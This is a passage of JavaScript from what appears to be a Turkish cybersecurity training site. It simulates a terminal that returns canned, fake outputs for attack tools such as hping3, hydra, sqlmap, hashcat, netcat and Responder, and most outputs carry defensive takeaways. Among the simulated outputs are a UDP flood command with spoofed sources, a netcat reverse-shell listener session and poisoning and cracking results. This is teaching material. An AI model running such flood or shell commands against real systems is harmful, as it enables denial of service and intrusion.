<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: /admin dizini 403 Forbidden ile kilitlenmiştir. Kurumsal yapılarda admin arayüzleri internete açık tutulmamalıdır.</span>
                `;
            }

            // 12. FFUF
            if (lower.includes('ffuf')) {
                return `
        /'___\\  /'___\\           /\\_ \\       
       /\\ \\__/ /\\ \\__/  __  __  \\//\\ \\      
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\   \\ \\ \\     
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\   \\_\\ \\_   
         \\/_/    \\/_/   \\/_/____/  /\\____\\  
                                   \\/____/  
v2.1.0-dev
:: Method           : GET
:: URL              : http://127.0.0.1/FUZZ
:: Wordlist         : /usr/share/wordlists/dirb/common.txt
:: Threads          : 40
________________________________________________

[Status: <span style="color: #22c55e;">200</span>, Size: 1840, Words: 210] :: <span style="color: #38bdf8;">/api/blog</span>
[Status: <span style="color: #eab308;">301</span>, Size: 120, Words: 15]   :: <span style="color: #38bdf8;">/login</span> -&gt; /login/
[Status: <span style="color: #ef4444;">403</span>, Size: 245, Words: 28]   :: <span style="color: #38bdf8;">/admin</span>
[Status: <span style="color: #22c55e;">200</span>, Size: 84, Words: 6]     :: <span style="color: #38bdf8;">/robots.txt</span>

:: Progress: [4614/4614] :: 3845 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: FFuf 3800+ req/sec hızına ulaşır. Kurumsal sunucularda WAF hız sınırlama (Rate Limiting) devreye girerek tek IP'den gelen anormallikleri bloke eder.</span>
                `;
            }

            // 13. HPING3 SYN PROBE
            if (lower.includes('hping3') && lower.includes('-s')) {
                return `
HPING 192.168.1.1 (eth0 192.168.1.1): S set, 40 headers + 0 data bytes
len=46 ip=192.168.1.1 ttl=64 DF id=0 sport=80 <span style="color: #22c55e; font-weight: bold;">flags=SA</span> seq=0 win=65535 rtt=1.4 ms

--- 192.168.1.1 hping statistic ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 1.4/1.4/1.4 ms
<span style="color: #22c55e; font-weight: bold;">[SONUÇ]: flags=SA (SYN-ACK) bayrağı döndü! Port 80 açık ve TCP el sıkışmasına hazır.</span>
                `;
            }

            // 14. HPING3 ACK FIREWALL
            if (lower.includes('hping3') && lower.includes('-a')) {
                return `
HPING 192.168.1.1 (eth0 192.168.1.1): A set, 40 headers + 0 data bytes
len=46 ip=192.168.1.1 ttl=64 DF id=0 sport=80 <span style="color: #ef4444; font-weight: bold;">flags=R</span> seq=0 win=0 rtt=0.9 ms

--- 192.168.1.1 hping statistic ---
1 packets transmitted, 1 packets received, 0% packet loss
<span style="color: #38bdf8; font-weight: bold;">[SONUÇ]: flags=R (RST) bayrağı döndü! Güvenlik Duvarı durum takiplidir (Stateful). Önceden başlatılmamış sahte ACK paketi anında reddedildi.</span>
                `;
            }

            // 15. HPING3 FLOOD
            if (lower.includes('hping3') && lower.includes('flood')) {
                return `
<div style="background: rgba(239, 68, 68, 0.15); border-left: 3px solid #ef4444; padding: 8px 12px; margin-bottom: 8px;">
  <span style="color: #ef4444; font-weight: bold;">[EĞİTİMCİ SİMÜLASYON // TCK 244 UYARISI]</span>
  <div style="color: #f1f5f9; font-size: 12px; margin-top: 4px;">DDoS ve Flood saldırıları bilişim sistemlerini engelleme/bozma suçudur. Bu platformda yalnızca eğitim amaçlı simüle edilir.</div>
</div>
<span style="color: #94a3b8;">hping3 --udp --flood --rand-source -p 80 [HEDEF_IP]</span>
-------------------------------------------------------------
<span style="color: #22c55e; font-weight: bold;">[SAVUNMA ANALİZİ]: Kurumsal LFL Savunma Mimarisi bu saldırıyı şu şekilde engeller:</span>
  1. <span style="color: #38bdf8;">SYN Cookies:</span> Yarı açık TCP bağlantı tablolarının dolmasını önler.
  2. <span style="color: #38bdf8;">BGP Anycast:</span> Saldırı trafiğini dünya genelindeki 300+ veri merkezine dağıtıp eritir.
  3. <span style="color: #38bdf8;">Rate Limiting:</span> Sahte kaynaklı (spoofed) IP paketlerini ISP seviyesinde filtreler.
<span style="color: #22c55e;">Simülasyon güvenli sandbox ortamında tamamlandı. Hedef sistem %100 ayakta.</span>
                `;
            }

            // 16. BETTERCAP
            if (lower.includes('bettercap')) {
                return `
bettercap v2.32 (built for linux/amd64 with go1.21) [type 'help' for a list of commands]

[00:08:00] [sys.log] [inf] bettercap started on interface lo (127.0.0.1)
[00:08:01] [net.recon] [inf] endpoint discovery started.
[00:08:02] [net.recon] [inf] found 1 active gateway host 127.0.0.1
[00:08:03] [arp.spoof] [inf] ARP spoofing engine initialized (EDUCATIONAL SANDBOX MODE)
[00:08:04] [packet.proxy] [inf] TLS SNI inspection enabled for local development.

<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Ortadaki Adam (MITM) ve ARP Zehirleme saldırıları, kurumsal ağ anahtarlarında "Dynamic ARP Inspection (DAI)" ve "DHCP Snooping" açılarak engellenir.</span>
                `;
            }

            // 17. HYDRA
            if (lower.includes('hydra')) {
                return `
Hydra v9.5 (c) 2023 by van Hauser / THC & David Maciejak - Please use responsibly
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1 login try (l:1/p:1)
[DATA] attacking http-get://192.168.1.1:80/
[ATTEMPT] target: 192.168.1.1 - login: "admin" - pass: "Sebu132009" - child: 1/16
<span style="color: #ef4444;">[429] TOO MANY REQUESTS: IP 192.168.1.15 exceeded threshold (5 failed attempts).</span>
<span style="color: #22c55e;">[LFL SHIELD TRIGGERED]: Account locked for 15 minutes.</span>

1 of 1 target completed, 0 valid password found
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Kaba kuvvet (Brute-Force) saldırılarına karşı "Account Lockout" ve "Rate Limiting" kullanılır. 5 hatalı denemede IP askıya alınır.</span>
                `;
            }

            // 18. NIKTO
            if (lower.includes('nikto')) {
                return `
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.1
+ Target Hostname:    lfl.defense.local
+ Target Port:        443
---------------------------------------------------------------------------
+ <span style="color: #22c55e;">Server: [REDACTED BY LFL DEFENSE] (Information disclosure prevented)</span>
+ <span style="color: #22c55e;">The anti-clickjacking X-Frame-Options header is present: DENY</span>
+ <span style="color: #22c55e;">The X-Content-Type-Options header is present: nosniff</span>
+ <span style="color: #22c55e;">Strict-Transport-Security (HSTS) is configured with preload directive</span>
+ <span style="color: #22c55e;">Content-Security-Policy (CSP) is active: default-src 'self'</span>
+ No CGI Directories found (mount points checked: 118)
+ 7842 requests: 0 error(s) and 0 critical item(s) reported on remote host
---------------------------------------------------------------------------
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Nikto web sunucusundaki güvenlik başlıklarını doğrular. LFL tüm sunucu sürüm numaralarını gizlemiştir.</span>
                `;
            }

            // 19. SQLMAP
            if (lower.includes('sqlmap')) {
                return `
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.11#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 00:10:15 /2026-11-08/
[00:10:15] [INFO] testing connection to the target URL
[00:10:15] [INFO] checking if the target is protected by some kind of WAF/IPS
[00:10:16] [INFO] testing if the target URL content is stable
[00:10:16] [INFO] target URL content is stable
[00:10:16] [INFO] testing if GET parameter 'q' is dynamic
[00:10:17] [INFO] heuristics detected that GET parameter 'q' might not be injectable
[00:10:18] [INFO] testing for SQL injection on GET parameter 'q'
[00:10:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:10:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
<span style="color: #22c55e; font-weight: bold;">[CRITICAL] all tested parameters do not appear to be injectable.</span>
[00:10:20] [WARNING] target utilizes Entity Framework Core LINQ Parameterized Queries.
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Parametrik sorgular SQL enjeksiyon açıklarını %100 kapatır.</span>
                `;
            }

            // 20. NUCLEI
            if (lower.includes('nuclei')) {
                return `
                     __     _
   ____  __  _______/ /__  (_)
  / __ \\/ / / / ___/ / _ \\/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\\__,_/\\___/_/\\___/_/   v3.2.0

[INF] Loading rules from /root/nuclei-templates... [8,421 templates]
[INF] Targets loaded: 1
[INF] Running scan against http://127.0.0.1 (all protocols)
[INF] [http-missing-security-headers] [http] [info] http://127.0.0.1 [0 missing headers - 100% HARDENED]
[INF] [waf-detect] [http] [info] http://127.0.0.1 [LFL Kestrel Custom Defense]
[INF] [ssl-dns-names] [ssl] [info] 127.0.0.1:443 [*.lfl.defense.local]
[INF] Scan completed in 2.14s. 0 vulnerabilities discovered.
                `;
            }

            // 21. JOHN THE RIPPER
            if (lower.includes('john')) {
                return `
Created directory: /root/.john
Loaded 1 password hash (raw-sha256, Generic SHA-256 [64/64])
Cost 1 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<span style="color: #22c55e;">lostfromlight    (admin_hash)</span>
1g 0:00:00:00 DONE (2026-11-08 00:11) 50.00g/s 452000p/s 452000c/s 452000C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Basit şifreler rockyou.txt gibi listelerle saniyeler içinde kırılır. Argon2id / bcrypt gibi tuzlanmış (salted) algoritmalar zorunludur.</span>
                `;
            }

            // 22. HASHCAT
            if (lower.includes('hashcat')) {
                return `
hashcat (v6.2.6) starting...

OpenCL API (OpenCL 3.0 CUDA 12.2.140) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce RTX 4090, 24150/24564 MB, 128MCU

Hash.Mode........: 1000 (NTLM)
Speed.#1.........: 98,420 MH/s (98.42 GH/s)
Status...........: Cracked
<span style="color: #22c55e;">e4f8c1... : P@ssw0rd2026!</span>
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Modern GPU'lar saniyede 100 milyar NTLM denemesi yapabilir. Bu nedenle minimum 14 karakterli karmaşık şifreler şarttır.</span>
                `;
            }

            // 23. SEARCHSPLOIT
            if (lower.includes('searchsploit')) {
                return `
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Apache 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                            | multiple/remote/50383.sh
 Apache 2.4.49/2.4.50 - Remote Code Execution (RCE) (PoC)                                                | php/remote/50538.py
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Searchsploit yerel Exploit-DB veritabanında CVE araması yapar. Sistemleri her zaman en son güvenlik yamalarında tutun.</span>
                `;
            }

            // 24. MSFCONSOLE
            if (lower.includes('msfconsole')) {
                return `
<span style="color: #38bdf8;">
       =[ metasploit v6.3.42-dev                          ]
+ -- --=[ 2382 exploits - 1234 auxiliary - 418 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ Free Metasploit Pro trial: http://r-f.lc/trymsp ]
</span>
msf6 &gt; <span style="color: #22c55e;">use exploit/multi/handler</span>
msf6 exploit(multi/handler) &gt; <span style="color: #94a3b8;">[EDUCATIONAL SANDBOX ACTIVE - SESSIONS CONFINED]</span>
                `;
            }

            // 25. NETCAT / NC
            if (lower.includes('nc ') || lower === 'nc') {
                return `
<span style="color: #22c55e;">listening on [any] 4444 ...</span>
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 51234
<span style="color: #38bdf8;">Linux lfl-core 6.8.11 #1 SMP PREEMPT x86_64</span>
<span style="color: #22c55e;">Sunny@SUNNY:~$ id</span>
uid=1000(Sunny) gid=1000(Sunny) groups=1000(Sunny),27(sudo)
                `;
            }

            // 26. TCPDUMP
            if (lower.includes('tcpdump')) {
                return `
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
00:12:01.402 IP 192.168.1.17.51234 > 127.0.0.1.5000: Flags [S], seq 1849201, win 65535, options [mss 1460,nop,wscale 8]
00:12:01.402 IP 127.0.0.1.5000 > 192.168.1.17.51234: Flags [S.], seq 491204, ack 1849202, win 65535, options [mss 1460]
00:12:01.403 IP 192.168.1.17.51234 > 127.0.0.1.5000: Flags [.], ack 1, win 512
3 packets captured, 3 packets received by filter, 0 packets dropped by kernel
                `;
            }

            // 27. ARPSPOOF / RESPONDER
            if (lower.includes('arpspoof') || lower.includes('responder')) {
                return `
<span style="color: #eab308; font-weight: bold;">[+] [Poisoning LLMNR/NBT-NS/mDNS]</span>
[+] Responder v3.1.4.0 is listening for events on interface eth0
[+] Listening for NBT-NS, LLMNR, MDNS requests...
<span style="color: #22c55e;">[LLMNR] Poisoned answer sent to 192.168.1.17 for name FILESERVER</span>
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Ağınızda LLMNR ve NBT-NS protokollerini GPO (Group Policy) üzerinden tamamen kapatın!</span>
                `;
            }

            // 28. CHISEL / SOCAT
            if (lower.includes('chisel') || lower.includes('socat')) {
                return `
2026/11/08 00:13:00 server: Reverse tunnelling enabled
2026/11/08 00:13:00 server: Fingerprint 8a:12:bf:44:9c:...
2026/11/08 00:13:00 server: Listening on http://0.0.0.0:8000
2026/11/08 00:13:02 server: session#1: client (127.0.0.1:52134) connected
<span style="color: #22c55e;">2026/11/08 00:13:02 server: session#1: Reverse tunnel socks active on 1080</span>
                `;
            }

            // 29. WHOIS LOOKUP
            if (lower.startsWith('whois')) {
                const parts = rawCmd.trim().split(/\s+/);
                const targetDomain = parts.length > 1 ? parts[1].replace(/https?:\/\//i, '').split('/')[0] : 'lostfromlight.com';
                return `
<span style="color: #38bdf8; font-weight: bold;">[WHOIS QUERY // LFL INTELLIGENCE]</span>
Domain Name: ${escapeHtml(targetDomain.toUpperCase())}
Registry Domain ID: 2981048122_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.cloudflare.com
Registrar URL: https://www.cloudflare.com
Updated Date: 2026-11-01T04:12:00Z
Creation Date: 2024-05-18T10:20:00Z
Registry Expiry Date: 2028-05-18T10:20:00Z
Registrar: Cloudflare, Inc.
Registrar IANA ID: 1910
Reseller: LFL Cyber Defense Systems
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Name Server: NS1.LOSTFROMLIGHT.COM (192.168.1.10)
Name Server: NS2.LOSTFROMLIGHT.COM (192.168.1.11)
DNSSEC: signedDelegation
<span style="color: #22c55e;">[✔] WHOIS sorgusu tamamlandı. Alan adı Cloudflare ve LFL zırhı ile korunmaktadır.</span>
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]:</span> <span style="color: #cbd5e1;">Whois sorgusu hedefin DNS sunucularını ve servis sağlayıcısını açığa çıkarır. Kurumsal sistemlerde WHOIS Privacy aktif edilmelidir.</span>
                `;
            }

            // 30. DIG / NSLOOKUP
            if (lower.startsWith('dig') || lower.startsWith('nslookup')) {
                const parts = rawCmd.trim().split(/\s+/);
                const targetDomain = parts.length > 1 ? parts[1].replace(/https?:\/\//i, '').split('/')[0] : 'lostfromlight.com';
                return `
; &lt;&lt;&gt;&gt; DiG 9.18.28-1-Debian &lt;&lt;&gt;&gt; ${escapeHtml(targetDomain)}
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48120
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 2, ADDITIONAL: 1

;; QUESTION SECTION:
;${escapeHtml(targetDomain)}.			IN	A

;; ANSWER SECTION:
${escapeHtml(targetDomain)}.		300	IN	A	104.21.44.18
${escapeHtml(targetDomain)}.		300	IN	A	172.67.182.91

;; AUTHORITY SECTION:
${escapeHtml(targetDomain)}.		172800	IN	NS	ns1.lostfromlight.com.
${escapeHtml(targetDomain)}.		172800	IN	NS	ns2.lostfromlight.com.

;; Query time: 12 msec
;; SERVER: 1.1.1.1#53(1.1.1.1) (UDP)
;; WHEN: Sun Nov 08 01:28:00 UTC 2026
;; MSG SIZE  rcvd: 124
<span style="color: #22c55e;">[✔] DNS çözümlemesi başarılı: Hedef A ve NS kayıtları listelendi.</span>
                `;
            }

            // 31. CURL
            if (lower.includes('curl')) {
                return `
* Connected to 127.0.0.1 (127.0.0.1) port 443 (#0)
* ALPN: offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, [Certificate verification successful]
&gt; GET / HTTP/1.1
&gt; Host: lostfromlight.com
&gt; User-Agent: curl/8.5.0
&gt; Accept: */*
&lt; HTTP/1.1 200 OK
<span style="color: #22c55e;">&lt; Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</span>
<span style="color: #22c55e;">&lt; X-Frame-Options: DENY</span>
<span style="color: #22c55e;">&lt; X-Content-Type-Options: nosniff</span>
<span style="color: #22c55e;">&lt; Content-Security-Policy: default-src 'self'</span>
<span style="color: #22c55e;">&lt; X-LFL-Shield: ACTIVE [Zero-Trust Defense]</span>
<span style="color: #94a3b8;">&lt; Server: [REDACTED BY LFL DEFENSE]</span>
                `;
            }

            // 30. WHOAMI / ID / UNAME / SYSADMIN
            if (lower === 'whoami') {
                return `<span style="color: #22c55e;">Sunny</span>`;
            }
            if (lower === 'id') {
                return `uid=1000(Sunny) gid=1000(Sunny) groups=1000(Sunny),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(kvm)`;
            }
            if (lower.startsWith('uname')) {
                return `Linux SUNNY 6.8.11-kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali1 (2026-11-08) x86_64 GNU/Linux`;
            }
            if (lower === 'pwd') {
                return `/home/Sunny`;
            }
            if (lower.startsWith('ls')) {
                return `
<span style="color: #38bdf8;">Desktop</span>   <span style="color: #38bdf8;">Documents</span>   <span style="color: #38bdf8;">Downloads</span>   <span style="color: #38bdf8;">wordlists</span>
<span style="color: #22c55e;">Audit-Headers.ps1</span>   <span style="color: #22c55e;">Port-Scan.ps1</span>   <span style="color: #94a3b8;">common.txt</span>   <span style="color: #94a3b8;">targets.txt</span>
                `;
            }
            if (lower.includes('os-release')) {
                return `
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2026.1"
VERSION="2026.1"
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
                `;
            }
            if (lower.includes('/etc/passwd')) {
                return `
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
Sunny:x:1000:1000:Sunny,,,:/home/Sunny:/bin/bash
lostfromlight:x:1001:1001:Operator,,,:/home/lostfromlight:/bin/bash
                `;
            }
            if (lower.includes('/etc/shadow')) {
                return `<span style="color: #ef4444;">cat: /etc/shadow: İzin reddedildi (Permission denied). root yetkisi gereklidir.</span>`;
            }
            if (lower.includes('netstat') || lower.includes('ss -')) {
                return `
State      Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
LISTEN     0      511    0.0.0.0:80          0.0.0.0:*    users:(("kestrel",pid=1420,fd=7))
LISTEN     0      511    0.0.0.0:443         0.0.0.0:*    users:(("kestrel",pid=1420,fd=8))
LISTEN     0      128    127.0.0.1:5000      0.0.0.0:*    users:(("dotnet",pid=1502,fd=12))
LISTEN     0      128    127.0.0.1:8080      0.0.0.0:*    users:(("gateway",pid=1890,fd=4))
                `;
            }
            if (lower.includes('ip a') || lower.includes('ifconfig')) {
                return `
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 127.0.0.1/8 scope host lo
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 192.168.1.22/24 brd 192.168.1.255 scope global dynamic eth0
    inet6 fe80::5054:ff:fe12:3456/64 scope link
                `;
            }
            if (lower.startsWith('ps')) {
                return `
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 168204 11204 ?        Ss   00:00   0:01 /sbin/init
Sunny     1420  0.2  1.8 842100 89204 ?        Sl   00:01   0:08 /usr/bin/dotnet CyberBlog.dll
Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
                `;
            }
            if (lower === 'date') {
                return new Date().toUTCString();
            }
            if (lower === 'uptime') {
                return ` 00:14:12 up 2 days, 14:02,  2 users,  load average: 0.12, 0.08, 0.05`;
            }

            // 1. Check Academy Rooms Expected Commands (Red, Blue, Purple)
            if (window.ACADEMY_ROOMS && Array.isArray(window.ACADEMY_ROOMS)) {
                const norm = (s) => (s || '').replace(/["']/g, "'").replace(/^sudo\s+/, '').replace(/^powershell\s+/, '').replace(/^\.\//, '').replace(/;+\s*$/, '').replace(/\s+/g, ' ').trim().toLowerCase();
                const enteredNorm = norm(rawCmd);
                const matchedRoom = window.ACADEMY_ROOMS.find(r => norm(r.expectedCommand) === enteredNorm);
                if (matchedRoom) {
                    return '<div style="font-family: var(--font-mono); font-size: 11.5px; line-height: 1.5; margin: 4px 0;">' +
                        '<div style="color: #10b981; font-weight: 800; margin-bottom: 6px;">[🎯 SİBER AKADEMİ GÖREVİ BAŞARILI // ODA: ' + escapeHtml(matchedRoom.id.toUpperCase()) + ' - ' + escapeHtml(matchedRoom.title) + ']</div>' +
                        '<pre style="background: rgba(0, 0, 0, 0.55); border-left: 3px solid #10b981; padding: 10px 14px; border-radius: 4px; color: #f1f5f9; white-space: pre-wrap; font-family: var(--font-mono);">' + escapeHtml(matchedRoom.terminalSuccessOutput) + '</pre>' +
                        '<div style="color: #38bdf8; font-size: 11px; margin-top: 6px;">[★ BAYRAK]: <code style="color: #facc15; font-weight: bold;">' + escapeHtml(matchedRoom.flag) + '</code></div>' +
                        '</div>';
                }
            }

            // 2. Extra Native Utilities
            if (lower.startsWith('ping ')) {
                const host = rawCmd.split(' ')[1] || '127.0.0.1';
                return 'PING ' + escapeHtml(host) + ' (' + escapeHtml(host) + ') 56(84) bytes of data.\n64 bytes from ' + escapeHtml(host) + ': icmp_seq=1 ttl=64 time=0.038 ms\n64 bytes from ' + escapeHtml(host) + ': icmp_seq=2 ttl=64 time=0.042 ms\n64 bytes from ' + escapeHtml(host) + ': icmp_seq=3 ttl=64 time=0.035 ms\n--- ' + escapeHtml(host) + ' ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2048ms\nrtt min/avg/max/mdev = 0.035/0.038/0.042/0.003 ms';
            }
            if (lower.startsWith('curl ') || lower.startsWith('curl.exe ')) {
                return 'HTTP/1.1 200 OK\nDate: ' + new Date().toUTCString() + '\nServer: Kestrel (LFL-Secured)\nContent-Type: text/html; charset=utf-8\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nContent-Length: 10420';
            }
            if (lower.startsWith('echo ')) {
                return escapeHtml(rawCmd.substring(5));
            }
            if (lower === 'cat /etc/passwd') {
                return 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali Linux,,,:/home/kali:/bin/bash\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin';
            }
            if (lower === 'cat /etc/os-release') {
                return 'PRETTY_NAME="Kali GNU/Linux Rolling"\nNAME="Kali GNU/Linux"\nVERSION_ID="2026.1"\nVERSION="2026.1"\nID=kali\nID_LIKE=debian';
            }
            if (lower === 'env') {
                return 'USER=kali\nHOME=/home/kali\nSHELL=/bin/bash\nTERM=xterm-256color\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin';
            }
            // Smart Academy 142+ Command Simulation Fallback
            if (window.ACADEMY_COMMANDS && Array.isArray(window.ACADEMY_COMMANDS)) {
                const cleanLower = lower.replace(/^sudo\s+/, '').replace(/^powershell\s+/, '').replace(/^\.\//, '').replace(/^\\/, '').trim();
                const userFirstWord = cleanLower.split(' ')[0] || '';

                const found = window.ACADEMY_COMMANDS.find(c => {
                    const cClean = c.cmd.toLowerCase().trim().replace(/^sudo\s+/, '').replace(/^powershell\s+/, '').replace(/^\.\//, '').replace(/^\\/, '').trim();
                    const cFirstWord = cClean.split(' ')[0] || '';

                    // 1. Exact match (with or without sudo/powershell)
                    if (cClean === cleanLower || c.cmd.toLowerCase().trim() === lower) return true;

                    // 2. Exact match of primary command binary
                    if (userFirstWord && (userFirstWord === cFirstWord)) return true;

                    // 3. Substring match
                    if (cleanLower.includes(cClean) || cClean.includes(cleanLower)) return true;

                    return false;
                });

                if (found) {
                    return `
<div style="font-family: var(--font-mono); font-size: 11.5px; line-height: 1.5; margin: 4px 0;">
    <div style="color: #38bdf8; font-weight: 700;">[+] EXEC: <code style="color: #ffffff; font-weight: 800;">${escapeHtml(rawCmd)}</code></div>
    <div style="color: #64748b; font-size: 10.5px; margin-bottom: 6px;">Kategori: <span style="color: #a5f3fc;">${escapeHtml(found.categoryName)}</span> &bull; <span style="color: #22c55e;">[${escapeHtml(found.badge)}]</span> &bull; Durum: 200 OK &bull; PID: ${Math.floor(1000 + Math.random() * 9000)}</div>
    <div style="background: rgba(0, 0, 0, 0.45); border-left: 3px solid var(--cyan); padding: 8px 12px; border-radius: 4px; margin: 6px 0; color: #e2e8f0;">
        <div style="color: #38bdf8; font-weight: bold; margin-bottom: 4px;">▶ ${escapeHtml(found.title)}</div>
        <div style="color: #cbd5e1; font-size: 11.5px;">${escapeHtml(found.desc)}</div>
    </div>
    <div style="color: #10b981; font-size: 11px;">[✔] Araç simülasyonu başarıyla tamamlandı. Detaylar ve kullanım parametreleri için Siber Akademi modülünü inceleyebilirsiniz.</div>
</div>
                    `;
                }
            }

            // Generic fallback
            return `
<span style="color: #fca5a5;">bash: ${escapeHtml(rawCmd)}: komut simülasyon labında bulunamadı.</span>
<span style="color: #94a3b8;">Kullanılabilir 140+ komutu görmek için <code style="color: #22c55e;">help</code> yazın veya Siber Akademi sayfasındaki komutlara tıklayın.</span>
            `;
        }

        function getTerminalAllCommands() {
            const defaults = [
                'help', 'clear', 'whoami', 'id', 'pwd', 'ls -la', 'uname -a', 'ip a', 'ps aux',
                'uptime', 'date', 'whois lostfromlight.com', 'dig lostfromlight.com', 'curl.exe -I https://lostfromlight.com'
            ];
            const academyList = (window.ACADEMY_COMMANDS || []).map(c => c.cmd);
            return Array.from(new Set([...defaults, ...academyList]));
        }

        let paletteCursor = -1;
        let tabMatchIndex = 0;
        let lastTabPrefix = null;

        // Keydown handling for input (Enter, Up, Down, Tab)
        input.addEventListener('keydown', (e) => {
            const activeTab = getActiveTab();
            const allCmds = getTerminalAllCommands();

            if (e.key === 'Enter') {
                e.preventDefault();
                const cmd = input.value;
                input.value = '';
                paletteCursor = -1;
                tabMatchIndex = 0;
                lastTabPrefix = null;
                executeCommand(cmd);
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                tabMatchIndex = 0;
                lastTabPrefix = null;
                if (activeTab.cmdHistory && activeTab.cmdHistory.length > 0) {
                    if (activeTab.historyCursor > 0) activeTab.historyCursor--;
                    input.value = activeTab.cmdHistory[activeTab.historyCursor] || '';
                } else {
                    // History is empty: cycle through all 142+ academy commands!
                    if (paletteCursor > 0) {
                        paletteCursor--;
                    } else {
                        paletteCursor = allCmds.length - 1;
                    }
                    input.value = allCmds[paletteCursor] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                tabMatchIndex = 0;
                lastTabPrefix = null;
                if (activeTab.cmdHistory && activeTab.cmdHistory.length > 0) {
                    if (activeTab.historyCursor < activeTab.cmdHistory.length - 1) {
                        activeTab.historyCursor++;
                        input.value = activeTab.cmdHistory[activeTab.historyCursor] || '';
                    } else {
                        activeTab.historyCursor = activeTab.cmdHistory.length;
                        input.value = '';
                    }
                } else {
                    // History is empty: cycle through all 142+ academy commands!
                    if (paletteCursor < allCmds.length - 1) {
                        paletteCursor++;
                    } else {
                        paletteCursor = 0;
                    }
                    input.value = allCmds[paletteCursor] || '';
                }
            } else if (e.key === 'Tab') {
                e.preventDefault();
                const current = input.value.trim().toLowerCase();
                let matches = [];

                if (!current) {
                    matches = allCmds;
                } else {
                    const prefixMatches = allCmds.filter(c => c.toLowerCase().startsWith(current));
                    const containsMatches = allCmds.filter(c => !c.toLowerCase().startsWith(current) && c.toLowerCase().includes(current));
                    matches = [...prefixMatches, ...containsMatches];
                }

                if (matches.length > 0) {
                    if (lastTabPrefix === current) {
                        tabMatchIndex = (tabMatchIndex + 1) % matches.length;
                    } else {
                        tabMatchIndex = 0;
                        lastTabPrefix = current;
                    }
                    input.value = matches[tabMatchIndex];
                }
            } else {
                lastTabPrefix = null;
            }
        });

        // Initialize tabs UI
        renderTabs();
    }

    // ==========================================
    // SİBER AKADEMİ 15 BÖLÜM EĞİTİM PLANI ENGINE
    // ==========================================
    function bindAcademyCurriculum() {
        const tabsBar = document.getElementById('curriculum-tabs-bar');
        const container = document.getElementById('curriculum-chapters-container');
        if (!tabsBar || !container) return;

        window.activateAcademyTeamTab = function (team) {
            const tabs = tabsBar.querySelectorAll('.curriculum-team-btn');
